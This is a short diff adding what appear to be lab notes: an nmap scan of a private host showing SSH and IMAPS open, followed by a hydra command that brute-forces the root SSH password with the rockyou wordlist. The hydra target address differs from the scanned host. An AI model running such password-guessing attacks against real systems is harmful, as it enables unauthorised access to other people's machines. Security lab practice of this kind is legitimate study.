@@ -1,0 +1,15 @@
+yuxuanz6@yzcmf:~$ nmap 192.168.200.5
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-11 01:26 UTC
+Nmap scan report for 192.168.200.5
+Host is up (0.00019s latency).
+Not shown: 998 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+993/tcp open  imaps
+
+Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
+
+
+
+
+hydra -s 22 -v -l root -P /usr/share/wordlists/rockyou.txt 192.168.0.108 ssh
